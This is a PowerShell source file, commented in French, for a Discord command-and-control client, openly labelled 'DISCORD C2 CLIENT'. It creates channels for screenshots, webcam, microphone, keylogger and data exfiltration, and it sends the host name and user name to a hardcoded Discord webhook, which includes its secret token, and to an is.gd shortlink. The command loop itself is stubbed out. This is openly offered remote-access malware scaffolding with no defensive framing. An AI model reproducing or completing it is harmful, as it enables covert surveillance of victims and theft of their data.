<#
DISCORD C2 CLIENT - SECURE VERSION
FEATURES:
- Token protégé (injection externe uniquement)
- Système d'erreurs avec webhook dédié
- Embeds professionnels avec couleurs
- Code modulaire et commenté
#>

# Configuration (sans token)
$global:errorWebhook = "https://discord.com/api/webhooks/1273395943873450107/BGtPgEvMWW60aW65PWHkV5aRTx2XY8lZeSdTsoxBn5-60GnWngbToICZ5o5MjgnuSaC2"
$global:parent = "https://is.gd/y92xe4"
$version = "2.1.0"

# ======================
# FONCTIONS UTILITAIRES
# ======================

function Send-ErrorToWebhook {
    param(
        [string]$ErrorMessage,
        [string]$Command,
        [string]$StackTrace
    )
    
    $errorPayload = @{
        username = "$env:COMPUTERNAME - Error"
        embeds = @(
            @{
                title = "⚠️ CRITICAL ERROR"
                color = 16711680 # Rouge
                fields = @(
                    @{ name = "Host"; value = "``$env:COMPUTERNAME``"; inline = $true },
                    @{ name = "User"; value = "``$env:USERNAME``"; inline = $true },
                    @{ name = "Command"; value = "``$Command``"; inline = $false },
                    @{ name = "Error"; value = "```$ErrorMessage```"; inline = $false },
                    @{ name = "Stack Trace"; value = "```$StackTrace```"; inline = $false }
                )
                timestamp = [DateTime]::UtcNow.ToString("o")
            }
        )
    } | ConvertTo-Json -Depth 10

    try {
        Invoke-RestMethod -Uri $global:errorWebhook -Method Post -Body $errorPayload -ContentType "application/json"
    } catch {
        Write-Host "[!] Failed to send error report" -ForegroundColor Red
    }
}

function Send-Embed {
    param(
        [string]$Title,
        [string]$Description,
        [int]$Color = 65280, # Vert par défaut
        [array]$Fields = @(),
        [string]$ChannelID = $global:SessionID
    )
    
    try {
        $embed = @{
            username = $env:COMPUTERNAME
            embeds = @(
                @{
                    title = $Title
                    description = $Description
                    color = $Color
                    fields = $Fields
                    timestamp = [DateTime]::UtcNow.ToString("o")
                }
            )
        }

        $headers = @{
            "Authorization" = "Bot $global:token"
            "Content-Type" = "application/json"
        }

        $body = $embed | ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$ChannelID/messages" -Method Post -Headers $headers -Body $body
    } catch {
        Send-ErrorToWebhook -ErrorMessage $_.Exception.Message -Command "Send-Embed" -StackTrace $_.ScriptStackTrace
    }
}

# ======================
# FONCTIONS CORE
# ======================

function Initialize-Session {
    try {
        # Création des salons Discord
        $channels = @{
            "session-control" = "🛡️ Session Control"
            "screenshots" = "🖥️ Screenshots" 
            "webcam" = "📸 Webcam"
            "microphone" = "🎤 Microphone"
            "keycapture" = "⌨️ Keylogger"
            "loot-files" = "💾 Data Exfiltration"
            "powershell" = "💻 PowerShell"
        }

        foreach ($channel in $channels.GetEnumerator()) {
            $body = @{
                name = $channel.Value
                type = 0
                parent_id = $global:CategoryID
            } | ConvertTo-Json

            $response = Invoke-RestMethod -Uri "https://discord.com/api/v10/guilds/$global:GuildID/channels" `
                -Method Post `
                -Headers @{ "Authorization" = "Bot $global:token"; "Content-Type" = "application/json" } `
                -Body $body

            Set-Variable -Name "global:$($channel.Key)ID" -Value $response.id
        }

        # Message de démarrage
        Send-Embed -Title "🚀 Session Initialized" -Description "``$env:COMPUTERNAME`` connected at ``$(Get-Date -Format 'dd/MM/yyyy HH:mm')``" -Color 5763719

    } catch {
        Send-ErrorToWebhook -ErrorMessage $_.Exception.Message -Command "Initialize-Session" -StackTrace $_.ScriptStackTrace
    }
}

function Start-Module {
    param(
        [string]$ModuleName,
        [string]$FriendlyName,
        [scriptblock]$ScriptBlock,
        [array]$Arguments
    )
    
    try {
        if (-not (Get-Job -Name $ModuleName -ErrorAction SilentlyContinue)) {
            Start-Job -Name $ModuleName -ScriptBlock $ScriptBlock -ArgumentList $Arguments
            Send-Embed -Title "✅ $FriendlyName Started" -Description "Module activated on ``$env:COMPUTERNAME``" -Color 5763719
        } else {
            Send-Embed -Title "⚠️ Module Already Running" -Description "$FriendlyName is already active" -Color 16776960
        }
    } catch {
        Send-ErrorToWebhook -ErrorMessage $_.Exception.Message -Command "Start-Module ($ModuleName)" -StackTrace $_.ScriptStackTrace
    }
}

# ======================
# POINT D'ENTRÉE
# ======================

try {
    # Vérification de l'injection du token
    if ([string]::IsNullOrEmpty($global:token)) {
        throw "Token not initialized. Please inject via command line."
    }

    # Initialisation
    Initialize-Session

    # Boucle principale
    while ($true) {
        # Logique de commandes ici
        # ...
        
        Start-Sleep -Seconds 5
    }

} catch {
    Send-ErrorToWebhook -ErrorMessage $_.Exception.Message -Command "Main Execution" -StackTrace $_.ScriptStackTrace
    exit 1
}
